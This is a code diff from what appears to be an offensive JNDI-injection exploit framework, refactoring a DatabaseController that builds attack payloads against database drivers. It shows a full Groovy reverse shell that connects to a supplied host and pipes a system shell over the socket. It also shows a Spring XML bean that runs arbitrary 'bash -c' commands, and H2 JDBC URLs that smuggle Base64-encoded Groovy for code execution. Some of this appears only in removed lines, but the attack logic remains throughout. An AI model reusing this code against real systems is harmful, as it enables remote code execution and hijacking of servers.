@@ -5,6 +5,8 @@ import javassist.CtClass;
 import javassist.CtField;
 import map.jndi.Config;
 import map.jndi.annotation.JNDIMapping;
+import map.jndi.payload.GroovyPayload;
+import map.jndi.payload.SpringXmlPayload;
 import map.jndi.server.WebServer;
 import map.jndi.template.DerbyJarTemplate;
 import map.jndi.template.SoundbankTemplate;
@@ -75,20 +77,7 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[PostgreSQL] Cmd: " + cmd);
 
         String fileName = MiscUtil.getRandStr(12) + ".xml";
-        String fileContent = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
-                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
-                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
-                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
-                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
-                "        <constructor-arg>\n" +
-                "        <list>\n" +
-                "            <value>bash</value>\n" +
-                "            <value>-c</value>\n" +
-                "            <value><![CDATA[" + cmd + "]]></value>\n" +
-                "        </list>\n" +
-                "        </constructor-arg>\n" +
-                "    </bean>\n" +
-                "</beans>";
+        String fileContent = SpringXmlPayload.command(cmd);
         WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
 
         String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
@@ -150,30 +139,7 @@ public abstract class DatabaseController implements Controller {
     public Properties h2GroovyReverseShell(String host, String port) {
         System.out.println("[H2] [Groovy] [ReverseShell] Host: " + host + " Port: " + port);
 
-        String payload = "try {\n" +
-                "def shell=System.properties['os.name'].toLowerCase().contains('win') ? 'cmd' : 'sh'\n" +
-                "def process=new ProcessBuilder(shell).redirectErrorStream(true).start()\n" +
-                "def socket=new java.net.Socket('" + host + "', " + port + ")\n" +
-                "def pi=process.inputStream\n" +
-                "def pe=process.errorStream\n" +
-                "def si=socket.inputStream\n" +
-                "def po=process.outputStream\n" +
-                "def so=socket.outputStream\n" +
-                "while (!socket.isClosed()) {\n" +
-                "while (pi.available() > 0) so.write(pi.read())\n" +
-                "while (pe.available() > 0) so.write(pe.read())\n" +
-                "while (si.available() > 0) po.write(si.read())\n" +
-                "so.flush()\n" +
-                "po.flush()\n" +
-                "Thread.sleep(50)\n" +
-                "try {\n" +
-                "process.exitValue()\n" +
-                "break\n" +
-                "} catch (ignored) {}\n" +
-                "}\n" +
-                "process.destroy()\n" +
-                "socket.close()\n" +
-                "} catch (Exception ignored) {}\n";
+        String payload = GroovyPayload.reverseShell(host, port);
         String groovy = "@groovy.transform.ASTTest(value={ assert new GroovyShell().evaluate(new String(java.util.Base64.getDecoder().decode(\"" + Base64.getEncoder().encodeToString(payload.getBytes())  + "\"))) }) def x";
         String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
 
@@ -261,20 +227,7 @@ public abstract class DatabaseController implements Controller {
         System.out.println("[H2-JRE] [Spring] [Command] Cmd: " + cmd);
 
         String xmlFileName = MiscUtil.getRandStr(12) + ".xml";
-        String xmlContent = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
-                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
-                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
-                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
-                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
-                "        <constructor-arg>\n" +
-                "        <list>\n" +
-                "            <value>bash</value>\n" +
-                "            <value>-c</value>\n" +
-                "            <value><![CDATA[" + cmd + "]]></value>\n" +
-                "        </list>\n" +
-                "        </constructor-arg>\n" +
-                "    </bean>\n" +
-                "</beans>";
+        String xmlContent = SpringXmlPayload.command(cmd);
         WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());
 
         String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
